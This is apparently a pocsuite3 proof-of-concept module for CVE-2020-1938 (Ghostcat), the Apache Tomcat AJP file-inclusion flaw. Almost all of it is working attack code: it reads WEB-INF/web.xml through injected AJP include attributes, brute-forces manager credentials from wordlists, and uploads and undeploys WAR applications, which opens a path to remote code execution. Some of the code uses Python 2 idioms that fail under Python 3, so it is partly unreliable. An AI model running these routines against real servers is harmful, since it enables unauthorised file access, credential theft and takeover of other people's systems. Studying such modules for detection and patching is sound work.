"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org

pip install :
ajpy==0.0.4
colorama==0.4.3
colorlog==4.1.0
"""

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list

from pocsuite3.lib.ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
from pprint import pprint, pformat
import socket
import argparse
import logging
import re
import os
# from StringIO import StringIO
import logging
from colorlog import ColoredFormatter
from urllib.parse import unquote,urlparse

socket.gethostbyname("localhost")

def setup_logger():
    """Return a logger with a default ColoredFormatter."""
    formatter = ColoredFormatter(
        "[%(asctime)s.%(msecs)03d] %(log_color)s%(levelname)-8s%(reset)s %(white)s%(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        reset=True,
        log_colors={
            'DEBUG': 'bold_purple',
            'INFO': 'bold_green',
            'WARNING': 'bold_yellow',
            'ERROR': 'bold_red',
            'CRITICAL': 'bold_red',
        }
    )

    logger = logging.getLogger('meow')
    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG)

    return logger

logger = setup_logger()

# helpers
def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
    fr.method = method
    fr.protocol = "HTTP/1.1"
    fr.req_uri = req_uri
    fr.remote_addr = target_host
    fr.remote_host = None
    fr.server_name = target_host
    fr.server_port = 80
    fr.request_headers = {
        'SC_REQ_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'SC_REQ_CONNECTION': 'keep-alive',
        'SC_REQ_CONTENT_LENGTH': '0',
        'SC_REQ_HOST': target_host,
        'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    fr.is_ssl = False

    fr.attributes = []

    return fr


class Tomcat(object):
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.connect((target_host, target_port))
        self.stream = self.socket.makefile("rb")

    def test_password(self, user, password):
        res = False
        stop = False
        self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode(
            'base64').replace('\n', '')
        while not stop:
            logger.debug("testing %s:%s" % (user, password))
            responses = self.forward_request.send_and_receive(self.socket, self.stream)
            snd_hdrs_res = responses[0]
            if snd_hdrs_res.http_status_code == 404:
                raise NotFoundException("The req_uri %s does not exist!" % self.req_uri)
            elif snd_hdrs_res.http_status_code == 302:
                self.req_uri = snd_hdrs_res.response_headers.get('Location', '')
                logger.info("Redirecting to %s" % self.req_uri)
                self.forward_request.req_uri = self.req_uri
            elif snd_hdrs_res.http_status_code == 200:
                logger.info("Found valid credz: %s:%s" % (user, password))
                res = True
                stop = True
                if 'Set-Cookie' in snd_hdrs_res.response_headers:
                    logger.info("Here is your cookie: %s" % (snd_hdrs_res.response_headers.get('Set-Cookie', '')))
            elif snd_hdrs_res.http_status_code == 403:
                logger.info("Found valid credz: %s:%s but the user is not authorized to access this resource" % (
                    user, password))
                stop = True
            elif snd_hdrs_res.http_status_code == 401:
                stop = True

        return res

    def start_bruteforce(self, users, passwords, req_uri, autostop):
        logger.info("Attacking a tomcat at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
        self.req_uri = req_uri
        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri)

        f_users = open(users, "r")
        f_passwords = open(passwords, "r")

        valid_credz = []
        try:
            for user in f_users:
                f_passwords.seek(0, 0)
                for password in f_passwords:
                    if autostop and len(valid_credz) > 0:
                        self.socket.close()
                        return valid_credz

                    user = user.rstrip('\n')
                    password = password.rstrip('\n')
                    if self.test_password(user, password):
                        valid_credz.append((user, password))
        except NotFoundException as e:
            logger.fatal(e.message)
        finally:
            logger.debug("Closing socket...")
            self.socket.close()
            return valid_credz

    def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
        self.req_uri = req_uri
        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,
                                                           method=AjpForwardRequest.REQUEST_METHODS.get(method))
        logger.debug("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
        if user is not None and password is not None:
            self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + (
                    "%s:%s" % (user, password)).encode('base64').replace('\n', '')

        for h in headers:
            self.forward_request.request_headers[h] = headers[h]

        for a in attributes:
            self.forward_request.attributes.append(a)

        responses = self.forward_request.send_and_receive(self.socket, self.stream)
        print(responses)
        if len(responses) == 0:
            return None, None

        snd_hdrs_res = responses[0]

        data_res = responses[1:-1]
        if len(data_res) == 0:
            logger.info("No data in response. Headers:\n %s" % pformat(vars(snd_hdrs_res)))

        return snd_hdrs_res, data_res

    def upload(self, filename, user, password, old_version, headers={}):
        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)
        with open(filename, "rb") as f_input:
            with open("/tmp/request", "w+b") as f:
                s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="deployWar"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n' % os.path.basename(
                    filename)
                s_form_footer = '\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'
                f.write(s_form_header)
                f.write(f_input.read())
                f.write(s_form_footer)

        data_len = os.path.getsize("/tmp/request")

        headers = {
            "SC_REQ_CONTENT_TYPE": "multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti",
            "SC_REQ_CONTENT_LENGTH": "%d" % data_len,
            "SC_REQ_REFERER": "http://%s/manager/html/" % (self.target_host),
            "Origin": "http://%s" % (self.target_host),
        }
        if obj_cookie is not None:
            headers["SC_REQ_COOKIE"] = obj_cookie.group('cookie')

        attributes = [{"name": "req_attribute", "value": ("JK_LB_ACTIVATION", "ACT")},
                      {"name": "req_attribute", "value": ("AJP_REMOTE_PORT", "12345")}]
        if old_version == False:
            attributes.append({"name": "query_string", "value": deploy_csrf_token})
        old_apps = self.list_installed_applications(user, password, old_version)
        r = self.perform_request("/manager/html/upload", headers=headers, method="POST", user=user, password=password,
                                 attributes=attributes)

        with open("/tmp/request", "rb") as f:
            br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)
            br.send_and_receive(self.socket, self.stream)

        r = AjpResponse.receive(self.stream)
        if r.prefix_code == AjpResponse.END_RESPONSE:
            logger.error('Upload failed')

        while r.prefix_code != AjpResponse.END_RESPONSE:
            r = AjpResponse.receive(self.stream)
        logger.debug('Upload seems normal. Checking...')
        new_apps = self.list_installed_applications(user, password, old_version)
        if len(new_apps) == len(old_apps) + 1 and new_apps[:-1] == old_apps:
            logger.info('Upload success!')
        else:
            logger.error('Upload failed')

    def get_error_page(self):
        return self.perform_request("/blablablablabla")

    def get_version(self):
        hdrs, data = self.get_error_page()
        for d in data:
            s = re.findall('(Apache Tomcat/[0-9\.]+) ', d.data)
            if len(s) > 0:
                return s[0]

    def get_csrf_token(self, user, password, old_version, headers={}, query=[]):
        # first we request the manager page to get the CSRF token
        hdrs, rdata = self.perform_request("/manager/html", headers=headers, user=user, password=password)
        deploy_csrf_token = re.findall('(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)"',
                                       "".join([d.data for d in rdata]))
        if old_version == False:
            if len(deploy_csrf_token) == 0:
                logger.critical("Failed to get CSRF token. Check the credentials")
                return

            logger.debug('CSRF token = %s' % deploy_csrf_token[0])
        obj = re.match("(?P<cookie>JSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly",
                       hdrs.response_headers.get('Set-Cookie', ''))
        if obj is not None:
            return deploy_csrf_token[0], obj
        return deploy_csrf_token[0], None

    def list_installed_applications(self, user, password, old_version, headers={}):
        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)
        headers = {
            "SC_REQ_CONTENT_TYPE": "application/x-www-form-urlencoded",
            "SC_REQ_CONTENT_LENGTH": "0",
            "SC_REQ_REFERER": "http://%s/manager/html/" % (self.target_host),
            "Origin": "http://%s" % (self.target_host),
        }
        if obj_cookie is not None:
            headers["SC_REQ_COOKIE"] = obj_cookie.group('cookie')

        attributes = [{"name": "req_attribute", "value": ("JK_LB_ACTIVATION", "ACT")},
                      {"name": "req_attribute",
                       "value": ("AJP_REMOTE_PORT", "{}".format(self.socket.getsockname()[1]))}]
        if old_version == False:
            attributes.append({
                "name": "query_string", "value": "%s" % deploy_csrf_token})
        hdrs, data = self.perform_request("/manager/html/", headers=headers, method="GET", user=user, password=password,
                                          attributes=attributes)
        found = []
        for d in data:
            im = re.findall('/manager/html/expire\?path=([^&]*)&', d.data)
            for app in im:
                found.append(unquote(app))
        return found

    def undeploy(self, path, user, password, old_version, headers={}):
        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)
        path_app = "path=%s" % path
        headers = {
            "SC_REQ_CONTENT_TYPE": "application/x-www-form-urlencoded",
            "SC_REQ_CONTENT_LENGTH": "0",
            "SC_REQ_REFERER": "http://%s/manager/html/" % (self.target_host),
            "Origin": "http://%s" % (self.target_host),
        }
        if obj_cookie is not None:
            headers["SC_REQ_COOKIE"] = obj_cookie.group('cookie')

        attributes = [{"name": "req_attribute", "value": ("JK_LB_ACTIVATION", "ACT")},
                      {"name": "req_attribute",
                       "value": ("AJP_REMOTE_PORT", "{}".format(self.socket.getsockname()[1]))}]
        if old_version == False:
            attributes.append({
                "name": "query_string", "value": "%s&%s" % (path_app, deploy_csrf_token)})
        r = self.perform_request("/manager/html/undeploy", headers=headers, method="POST", user=user, password=password,
                                 attributes=attributes)
        r = AjpResponse.receive(self.stream)
        if r.prefix_code == AjpResponse.END_RESPONSE:
            logger.error('Undeploy failed')

        # Check the successful message
        found = False
        regex = r'<small><strong>Message:<\/strong><\/small>&nbsp;<\/td>\s*<td class="row-left"><pre>(OK - .*' + path + ')\s*<\/pre><\/td>'
        while r.prefix_code != AjpResponse.END_RESPONSE:
            r = AjpResponse.receive(self.stream)
            if r.prefix_code == 3:
                f = re.findall(regex, r.data)
                if len(f) > 0:
                    found = True
        if found:
            logger.info('Undeploy succeed')
        else:
            logger.error('Undeploy failed')


class DemoPOC(POCBase):
    vulID = '98134'  # ssvid
    version = '1.0'
    author = ['Snowty']
    vulDate = '2020-01-06'
    createDate = '2020-02-28'
    updateDate = '2020-02-28'
    references = ['https://www.cnvd.org.cn/webinfo/show/5415','https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi','https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC']
    name = 'Apache Tomcat Ajp协议 文件包含漏洞'
    appPowerLink = 'http://tomcat.apache.org/'
    appName = 'Apache Tomcat'
    appVersion = '6, 7 < 7.0.100, 8 < 8.5.51 , 9 < 9.0.31 '
    vulType = VUL_TYPE.ARBITRARY_FILE_READ # 任意文件读取
    desc = '''2020年1月6日，CNVD收录了由长亭科技发现并报送的Apache Tomcat Ajp协议 文件包含漏洞（CNVD-2020-10487，对应CVE-2020-1938）。
              攻击者利用该漏洞，可在未授权的情况下远程读取特定目录下的任意文件。
              2020年2月20日，该漏洞的POC在网上公开。配合文件上传漏洞可实现RCE
           '''
    samples = ['127.0.0.1']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _check(self, url):
        flag = 'Welcome to Tomcat'
        bf = Tomcat(urlparse(url).netloc, 8009)
        attributes = [
            {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
            {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', 'WEB-INF/web.xml']},
            {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
        ]
        _, data = bf.perform_request(req_uri='/',method='GET', attributes=attributes)
        # print(data)
        for d in data:
            try:
                result = d.data.decode('utf8')
            except UnicodeDecodeError:
                result = repr(d.data)
        # print(result)
        if flag in result:
            return 8009,'WEB-INF/web.xml'
        else:
            return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        print(p)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Port'] = p[0]
            result['VerifyInfo']['File'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        return self._verify() 

    def _shell(self):
        return self._verify() 
        
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
